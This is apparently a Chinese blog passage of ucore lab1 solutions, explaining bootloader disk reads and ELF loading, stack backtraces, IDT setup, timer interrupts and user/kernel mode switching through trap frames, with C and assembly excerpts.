<h1 id="bootloader加载ELF格式的OS的过程"><a href="#bootloader加载ELF格式的OS的过程" class="headerlink" title="bootloader加载ELF格式的OS的过程"></a>bootloader加载ELF格式的OS的过程</h1><blockquote>
<p>bootloader如何读取硬盘扇区的？</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>);                         <span class="comment">// count = 1</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);</span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);                      <span class="comment">// cmd 0x20 - read sectors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read a sector</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。<br>读取一个扇区的流程为：</p>
<ul>
<li>循环访问0x1f7端口，等待磁盘准备好</li>
<li>向0x1f2端口写入希望读取的扇区个数</li>
<li>0x1F3 LBA模式 0-7<br>0x1F4 LBA模式 8-15<br>0x1F5 LBA模式 16-23<br>0x1F6 LBA模式 24-27 28-31位位为0111，28位(=0)表示访问”Disk 0”</li>
<li>向0x1f7端口写入0x20命令，为读取扇区</li>
<li>等待扇区读写完成</li>
<li>读取一个扇区的内容到指定虚拟内存中</li>
</ul>
<blockquote>
<p>Bootloader如何加载ELF格式的操作系统？</p>
</blockquote>
<p>参照wiki上的<a href="https://wiki.osdev.org/ELF">ELF格式</a>可知elfhdr和proghdr格式，对应数据结构定义为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* file header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_magic;     <span class="comment">// must equal ELF_MAGIC</span></span><br><span class="line">    <span class="keyword">uint8_t</span> e_elf[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">uint16_t</span> e_type;      <span class="comment">// 1=relocatable, 2=executable, 3=shared object, 4=core image</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_machine;   <span class="comment">// 3=x86, 4=68K, etc.</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_version;   <span class="comment">// file version, always 1</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_entry;     <span class="comment">// entry point if executable</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_phoff;     <span class="comment">// file position of program header or 0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_shoff;     <span class="comment">// file position of section header or 0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_flags;     <span class="comment">// architecture-specific flags, usually 0</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_ehsize;    <span class="comment">// size of this elf header</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_phentsize; <span class="comment">// size of an entry in program header</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_phnum;     <span class="comment">// number of entries in program header or 0</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_shentsize; <span class="comment">// size of an entry in section header</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_shnum;     <span class="comment">// number of entries in section header or 0</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_shstrndx;  <span class="comment">// section number that contains section name strings</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* program section header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_type;   <span class="comment">// loadable code or data, dynamic linking info,etc.</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_offset; <span class="comment">// file offset of segment</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_va;     <span class="comment">// virtual address to map segment</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_pa;     <span class="comment">// physical address, not used</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_filesz; <span class="comment">// size of segment in file</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_memsz;  <span class="comment">// size of segment in memory (bigger if contains bss）</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_flags;  <span class="comment">// read/write/execute bits</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_align;  <span class="comment">// required alignment, invariably hardware page size</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>执行完<code>bootasm.S</code>后，系统进入保护模式，调用<code>bootmain</code>加载OS</p>
<ul>
<li>将ELF文件头的8个扇区(主引导扇区后的一页)读取到内存的<code>0x10000</code>以后区域，作为ELF头的临时存储便于后续的访问</li>
<li>通过检测magic值判断ELF文件是否合法</li>
<li>从ELF头部读取<code>Program Header</code>表的偏移和长度</li>
<li>遍历所有的<code>Program Header</code>：拷贝其中定义的数据到虚拟内存地址中去</li>
<li>跳转到ELF头定义的起始运行地址开始执行</li>
</ul>
<h1 id="函数调用堆栈跟踪函数"><a href="#函数调用堆栈跟踪函数" class="headerlink" title="函数调用堆栈跟踪函数"></a>函数调用堆栈跟踪函数</h1><p>首先通过调用<code>read_eip()</code>和<code>read_ebp()</code>来获取对应的值，然后更新eip和ebp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	  <span class="keyword">uint32_t</span> eip=read_eip(),ebp=read_ebp();</span><br><span class="line">	  <span class="keyword">int</span> i,j;</span><br><span class="line">	  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;STACKFRAME_DEPTH&amp;&amp;ebp!=<span class="number">0</span>;i++)</span><br><span class="line">	  &#123;</span><br><span class="line">		  cprintf(<span class="string">&quot;ebp:0x%08x eip:0x%08x args:&quot;</span>, ebp, eip);</span><br><span class="line">		  <span class="keyword">uint32_t</span>  *args=(<span class="keyword">uint32_t</span> *)ebp+<span class="number">2</span>;</span><br><span class="line">		  <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">		  &#123;</span><br><span class="line">			  cprintf(<span class="string">&quot;0x%08x &quot;</span>,args[j]);</span><br><span class="line">		  &#125;</span><br><span class="line">		  print_debuginfo(eip<span class="number">-1</span>);</span><br><span class="line">		  eip=((<span class="keyword">uint32_t</span> *) ebp)[<span class="number">1</span>];</span><br><span class="line">		  ebp=((<span class="keyword">uint32_t</span> *) ebp)[<span class="number">0</span>];</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后一行为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ebp:<span class="number">0x00007bf8</span> eip:<span class="number">0x00007d68</span> args:<span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00007c4f</span></span><br><span class="line">	    &lt;unknow&gt;: -- <span class="number">0x00007d67</span> --</span><br></pre></td></tr></table></figure>
<p>其对应的是第一个使用堆栈的函数，<code>bootmain.c</code>中的<code>bootmain</code>。<br><code>bootloader</code>设置的堆栈从<code>0x7c00</code>开始，使用<code>call bootmain</code>转入<code>bootmain</code>函数。<br>call指令压栈，所以<code>bootmain</code>中ebp为<code>0x7bf8</code>。</p>
<blockquote>
<p>在kdebug.c文件中用到的函数read_ebp是内联的，而函数read_eip不是内联的。为什么要设计成这样？</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">uint32_t</span></span><br><span class="line">read_eip(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> eip;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;movl 4(%%ebp), %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (eip))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> eip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint32_t</span></span><br><span class="line">read_ebp(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (ebp))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ebp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ebp可以直接获得，在函数调用过程中有压栈操作，若不内联，则会因为函数调用对栈的修改而得到错误的ebp值。而由于没有直接获取eip值的指令，我们需要利用call指令将eip压栈的特性，压栈后当前eip(即下一次函数调用后的返回地址)位于ebp之上，通过调用<code>read_eip</code>函数来读出压在栈上的eip的值。若将read_eip内联，则不会有函数调用存在，无法获得eip的值。</p>
<h1 id="中断初始化和处理"><a href="#中断初始化和处理" class="headerlink" title="中断初始化和处理"></a>中断初始化和处理</h1><p>中断向量表的建立和初始化工作是由BIOS在计算机启动时完成的。中断向量表为32位保护模式下的中断描述符表。中断描述符表把每个中断或异常编号和一个指向中断服务例程的描述符关联起来。</p>
<blockquote>
<p>中断描述符表中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Gate descriptors for interrupts and traps */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gatedesc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_off_15_0 : <span class="number">16</span>;      <span class="comment">// low 16 bits of offset in segment</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_ss : <span class="number">16</span>;            <span class="comment">// segment selector</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_args : <span class="number">5</span>;           <span class="comment">// # args, 0 for interrupt/trap gates</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_rsv1 : <span class="number">3</span>;           <span class="comment">// reserved(should be zero I guess)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_type : <span class="number">4</span>;           <span class="comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_s : <span class="number">1</span>;              <span class="comment">// must be 0 (system)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_dpl : <span class="number">2</span>;            <span class="comment">// descriptor(meaning new) privilege level</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_p : <span class="number">1</span>;              <span class="comment">// Present</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_off_31_16 : <span class="number">16</span>;     <span class="comment">// high bits of offset in segment</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>从上可知，中断描述符表一个表项共有64位，8个字节，0~15位和16到31位分别为偏移量的低位和高位，16到31位为段选择子，通过选择子找到中断服务例程的入口。</p>
<blockquote>
<p>请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">255</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class="line">        <span class="comment">//对中断描述符中每一个表项进行设置</span></span><br><span class="line">    &#125;</span><br><span class="line">    SETGATE(idt[T_SWITCH_TOK], <span class="number">1</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);</span><br><span class="line">    <span class="comment">//系统调用从用户态切换到内核态，与Interrupt Gate处理方式不同，所以单独设置系统调用</span></span><br><span class="line">    lidt(&amp;idt_pd);</span><br><span class="line">    <span class="comment">//将中断向量表加载到ldtr寄存器中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>系统调用为用户态操作，所以权限设置为用户态权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * Set up a normal interrupt/trap gate descriptor</span></span><br><span class="line"><span class="comment"> *   - istrap: 1 for a trap (= exception) gate, 0 for an interrupt gate</span></span><br><span class="line"><span class="comment"> *   - sel: Code segment selector for interrupt/trap handler</span></span><br><span class="line"><span class="comment"> *   - off: Offset in code segment for interrupt/trap handler</span></span><br><span class="line"><span class="comment"> *   - dpl: Descriptor Privilege Level - the privilege level required</span></span><br><span class="line"><span class="comment"> *          for software to invoke this interrupt/trap gate explicitly</span></span><br><span class="line"><span class="comment"> *          using an int instruction.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SETGATE(gate, istrap, sel, off, dpl) &#123;            \</span></span><br><span class="line">    (gate).gd_off_15_0 = (<span class="keyword">uint32_t</span>)(off) &amp; <span class="number">0xffff</span>;        \</span><br><span class="line">    (gate).gd_ss = (sel);                                \</span><br><span class="line">    (gate).gd_args = <span class="number">0</span>;                                    \</span><br><span class="line">    (gate).gd_rsv1 = <span class="number">0</span>;                                    \</span><br><span class="line">    (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32;    \</span><br><span class="line">    (gate).gd_s = <span class="number">0</span>;                                    \</span><br><span class="line">    (gate).gd_dpl = (dpl);                                \</span><br><span class="line">    (gate).gd_p = <span class="number">1</span>;                                    \</span><br><span class="line">    (gate).gd_off_31_16 = (<span class="keyword">uint32_t</span>)(off) &gt;&gt; <span class="number">16</span>;        \</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GD_KTEXT    ((SEG_KTEXT) &lt;&lt; 3)        <span class="comment">// kernel text</span></span></span><br></pre></td></tr></table></figure>
<p>从以上看出设置中断向量表时默认将istrap字段设置为1，即默认为interrupt，设置段寄存器为内核态的CS，即由内核来处理中断。</p>
<blockquote>
<p>trap和interrupt的区别是什么？如果只为trap建立了idt那interrupt的idt在哪里建立？</p>
</blockquote>
<p>在ucore中,trap用来实现系统调用，interrupt用来实现对外设中断的处理等。trap和intr都在idt处要建立，根据vectors中的具体类型(trap或interrupt)分别初始化。lab1统一将第二个参数设置为interrupt, 是因为lab1暂时不用处理trap, 所以进行了简化处理. 类似情形在ucore labs中时常出现, 所以以后的lab会时常补充修正之前lab的代码。trap gate与interrupt gate的唯一区别，是调用interrupt gate里的handler前会清EFLAGS的IF位（即关中断），而调用trap gate的handler时对IF位没有影响。当调用Interrupt Gate 时,Interrupt 会被 CPU 自动禁止;而调用 Trap Gate 时,CPU 则不会去禁止或打开中断,而是保留它原来的样子。 vectors的256个元素中, 0<del>31是保留的, 用于处理异常和NMI(不可屏蔽中断); 32</del>255由用户定义, 可以是设备中断或系统调用。 </p>
<p><code>__vectors[]</code>由<code>vector.c</code>生成,其中有些异常会产生错误码(比如页访问异常)，有些异常不产生，为了统一，对于不产生的异常pushl 0。</p>
<p><img src="https://i.loli.net/2019/10/27/58kdGhp13SfDaUH.png"></p>
<p>以上为每个中断向量对应的错误码，其中8，10，11，12，13，14，17均会产生错误码。</p>
<p><code>vectors.S</code>中对应的中断向量表摘录部分如下 :  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl __alltraps</span><br><span class="line">.globl vector8</span><br><span class="line">vector8:</span><br><span class="line">  pushl $<span class="number">8</span></span><br><span class="line">  jmp __alltraps</span><br><span class="line">vector10:</span><br><span class="line">  pushl $<span class="number">10</span></span><br><span class="line">  jmp __alltraps</span><br><span class="line">.globl vector11</span><br><span class="line">vector11:</span><br><span class="line">  pushl $<span class="number">11</span></span><br><span class="line">  jmp __alltraps</span><br><span class="line">.globl vector12</span><br><span class="line">vector12:</span><br><span class="line">  pushl $<span class="number">12</span></span><br><span class="line">  jmp __alltraps</span><br><span class="line">.globl vector13</span><br><span class="line">vector13:</span><br><span class="line">  pushl $<span class="number">13</span></span><br><span class="line">  jmp __alltraps</span><br><span class="line">.globl vector14</span><br><span class="line">vector14:</span><br><span class="line">  pushl $<span class="number">14</span></span><br><span class="line">  jmp __alltraps</span><br><span class="line">.globl vector17</span><br><span class="line">vector17:</span><br><span class="line">  pushl $<span class="number">17</span></span><br><span class="line">  jmp __alltraps  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>请编程完善trap.c中的中断处理函数trap，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ticks++;</span><br><span class="line"><span class="keyword">if</span>(ticks==TICK_NUM)&#123;</span><br><span class="line">   print_ticks();</span><br><span class="line">   ticks=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>trap类型的中断门与interrupt类型的中断门有啥设置上的差别？如果在设置中断门上不做区分，会有什么可能的后果?</p>
</blockquote>
<ul>
<li>调用Interrupt Gate时，Interrupt会被CPU自动禁止</li>
<li>调用Trap Gate时，CPU则不会去禁止或打开中断，而是保留它原来的样子</li>
<li>如果在设置上不做区分，会导致重复触发中断</li>
<li>硬件中断是可以嵌套的，但指的并不是在处理一个硬件中断的过程中把这个过程打断，而是先关掉中断，处理完当前中断之后再顺序处理下一个。</li>
</ul>
<blockquote>
<p>CPU加电初始化后中断是使能的吗？为什么？</p>
</blockquote>
<p>不是。CPU启动后，BIOS会在POST自检完成后在内存中建立中断向量表和中断服务程序，但此时并没有使能中断，实模式下不具备处理普通中断的能力，IDT的初始化是在ucore中完成。</p>
<h1 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h1><p>中断服务例程的调用和返回时用户态进程获得(或强制进入OS服务)的唯一途径，需要进行现场保存和特权级切换。</p>
<p>处理器调用中断服务例程的过程为</p>
<ul>
<li>如果该中断服务例程运行在一个更高的特权级下，则会发生栈切换，过程如下：<ul>
<li>从当前执行任务的TSS中获得ISR将会使用的段选择子和栈指针，将被打断的程序的堆栈段选择子和栈指针压入新栈中</li>
<li>处理器随后将EFLAGS、CS和EIP寄存器的当前值压入新栈中</li>
<li>如果异常有错误码，则也将错误码压入栈中，位于EIP指针之后</li>
</ul>
</li>
<li>如果该中断服务例程的特权级不变<ul>
<li>处理器直接将EFLAGS、CS、EIP寄存器的当前值压入栈中</li>
<li>如果异常有错误码，则将错误码也压入栈中，位于EIP的值之后</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2019/10/26/BVJHOEqFjNtTrcY.png"></p>
<p>从中断服务例程返回时，必须使用IRET（或IRETD）指令。IRET指令类似于RET指令，但是它会对保存的寄存器和EFLAGS进行恢复（EFLAGS可能会进行一些修改）。如果调用中断服务例程时发生了栈切换，则IRET指令会在返回时切换回被打断的程序的栈。</p>
<blockquote>
<p>扩展proj4,增加syscall功能，即增加一用户态函数（可执行一特定系统调用：获得时钟计数值），当内核初始完毕后，可从内核态返回到用户态的函数，而用户态的函数又通过系统调用得到内核态的服务从内核态返回到用户态</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过软中断完成内核态到用户态的返回</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lab1_switch_to_user</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">   <span class="comment">//栈顶指针偏移，分配SS和ESP所需空间</span></span><br><span class="line">	<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;sub $0x8, %%esp \n&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;int %0 \n&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;movl %%ebp, %%esp&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    : </span></span></span><br><span class="line"><span class="function"><span class="params">	    : <span class="string">&quot;i&quot;</span>(T_SWITCH_TOU)</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在触发中断时在栈中分配了ss和esp所需的空间，调用<code>lab1_switch_to_user</code>时，由于没有局部变量,所以ebp和esp相等,<code>sub $0x8, %%esp</code>, 将栈抬高了8个字节,相当于ss和esp两个寄存器的值, 然后进入int中断处理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------栈顶</span><br><span class="line">各种局部变量(trap_dispatch中的局部变量)</span><br><span class="line">eip(trap_dispatch函数压入)</span><br><span class="line">ebp(trap_dispatch函数压入)</span><br><span class="line">trapframe指针(trap_dispatch参数)</span><br><span class="line">eip(trapentry中的call指令压入的)</span><br><span class="line">esp(就是个参数,相当于那个trapframe指针)</span><br><span class="line">trapframe(不含ss和esp)</span><br><span class="line">8字节(在lab1_switch_to_user中sub出来的空间)</span><br><span class="line">之前的数据</span><br><span class="line">-----------栈底</span><br></pre></td></tr></table></figure>
<p>在lab1的参考答案中，<a href="https://piazza.com/class/i5j09fnsl7k5x0?cid=122">参考piazza上对应讨论</a>，再次将返回栈顶置为<code>switchk2u.tf_esp = (uint32_t)tf + sizeof(struct trapframe)- 8</code>;本意是指向上个trapframe也就是之前的数据,但是却指向了8个字节的空闲位置,这是有问题的,此时之前的函数对应的堆栈是混乱的，但是程序可以正常运行，问题在于<code>lab1_switch_to_user</code>函数在int之后<code>movl %%ebp, %%esp</code>,相当于又恢复了之前的esp。</p>
<p>从用户态返回到内核态</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lab1_switch_to_kernel</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//int T_SWITCH_TOK(121)中断，恢复之前寄存器</span></span><br><span class="line">	<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;int %0 \n&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    <span class="string">&quot;movl %%ebp, %%esp \n&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">	    : </span></span></span><br><span class="line"><span class="function"><span class="params">	    : <span class="string">&quot;i&quot;</span>(T_SWITCH_TOK)</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改中断处理部分如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义临时的栈帧数据结构或者数据结构指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">switchk2u</span>, *<span class="title">switchu2k</span>;</span></span><br><span class="line"><span class="keyword">case</span> T_SWITCH_TOU:</span><br><span class="line">    <span class="keyword">if</span>(tf-&gt;tf_cs!=USER_CS)&#123;</span><br><span class="line">        switchk2u=*tf;</span><br><span class="line">        switchk2u.tf_cs=USER_CS;<span class="comment">//CS设置为用户代码段</span></span><br><span class="line">        switchk2u.tf_ds=switchk2u.tf_cs=switchk2u.tf_ss=USER_DS;<span class="comment">//其余段设置为用户数据段</span></span><br><span class="line">        switchk2u.tf_eflags|=FL_IOPL_MASK;<span class="comment">//设置eflags在用户态可以进行I/O操作</span></span><br><span class="line">        switchk2u.tf_esp=(<span class="keyword">uint32_t</span>)tf+<span class="keyword">sizeof</span>(struct trapframe)<span class="number">-8</span>;</span><br><span class="line">        <span class="comment">//tf_esp在trapframe中的地址</span></span><br><span class="line">        *((<span class="keyword">uint32_t</span> *)tf<span class="number">-1</span>)=(<span class="keyword">uint32_t</span>)&amp;switchk2u;</span><br><span class="line">        <span class="comment">//设置临时栈，指向switchk2u</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> T_SWITCH_TOK:</span><br><span class="line">    <span class="keyword">if</span> (tf-&gt;tf_cs != KERNEL_CS) &#123;</span><br><span class="line">        tf-&gt;tf_cs = KERNEL_CS;<span class="comment">//直接修改内核堆栈</span></span><br><span class="line">        tf-&gt;tf_ds = tf-&gt;tf_es = KERNEL_DS;</span><br><span class="line">        tf-&gt;tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line">        switchu2k = (struct trapframe *)(tf-&gt;tf_esp - (<span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>));</span><br><span class="line">        <span class="comment">//tf结构体开始的位置</span></span><br><span class="line">        memmove(switchu2k, tf, <span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>);</span><br><span class="line">        <span class="comment">//由于进入中断时，是用户态进入内核态，而退出中断时，是内核态返回内核态</span></span><br><span class="line">        <span class="comment">//所以去掉最后的esp与ss</span></span><br><span class="line">        *((<span class="keyword">uint32_t</span> *)tf - <span class="number">1</span>) = (<span class="keyword">uint32_t</span>)switchu2k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><a href="https://piazza.com/class/i5j09fnsl7k5x0?cid=306">特权切换</a>，在内核态切换到用户态时，栈的示意图如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------栈顶</span><br><span class="line">各种局部变量(trap_dispatch中的局部变量)</span><br><span class="line">eip(trap_dispatch函数压入)</span><br><span class="line">ebp(trap_dispatch函数压入)</span><br><span class="line">trapfram指针(trap_dispatch参数)</span><br><span class="line">eip(trapentry中的call指令压入的)</span><br><span class="line">esp(就是个参数,相当于那个trapframe指针)</span><br><span class="line">trapframe(不含ss和esp)</span><br><span class="line">之前的数据</span><br><span class="line">-----------栈底</span><br></pre></td></tr></table></figure>
<p>在trapframe下面再添加ss和esp,在切换之后栈的布局应该如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------栈顶</span><br><span class="line">各种局部变量(trap_dispatch中的局部变量)</span><br><span class="line">eip(trap_dispatch函数压入)</span><br><span class="line">ebp(trap_dispatch函数压入)</span><br><span class="line">trapfram指针(trap_dispatch参数)</span><br><span class="line">eip(trapentry中的call指令压入的)</span><br><span class="line">esp(就是个参数,相当于那个trapframe指针)</span><br><span class="line">trapframe(不含ss和esp)</span><br><span class="line">esp</span><br><span class="line">ss</span><br><span class="line">之前的数据</span><br><span class="line">-----------栈底</span><br></pre></td></tr></table></figure>
<p>内核态切换到用户态时在栈中需要再存放ss和esp，在ucore中通过设置全局变量来作为临时的trapframe，而内核态切换到用户态相反，则直接在栈上修改。</p>
<p><code>trapentry.S</code>中<code>call trap</code>前后代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># push %esp to pass a pointer to the trapframe as an argument to trap()</span></span><br><span class="line">    pushl %esp</span><br><span class="line"></span><br><span class="line"><span class="meta"># call trap(tf), where tf=%esp</span></span><br><span class="line">    call trap</span><br><span class="line"></span><br><span class="line"><span class="meta"># pop the pushed stack pointer</span></span><br><span class="line">    popl %esp</span><br></pre></td></tr></table></figure>
<p><code>((uint32_t *)tf - 1)</code> 处存储tf的地址，作为<code>trap</code>的参数。将该地址处的值修改为<code>switchk2u</code>的地址，iret返回时，CPU会从<code>switchk2u</code>恢复数据，而不是从之前的tf恢复数据。</p>
<blockquote>
<p>用键盘实现用户模式内核模式切换。具体目标是：“键盘输入3时切换到用户模式，键盘输入0时切换到内核模式”。 基本思路是借鉴软中断(syscall功能)的代码，并且把trap.c中软中断处理的设置语句拿过来</p>
</blockquote>
<p>对于按键的中断响应在IRQ_KBD中，在<code>trap_dispatch</code>中添加以下代码即可：</p>
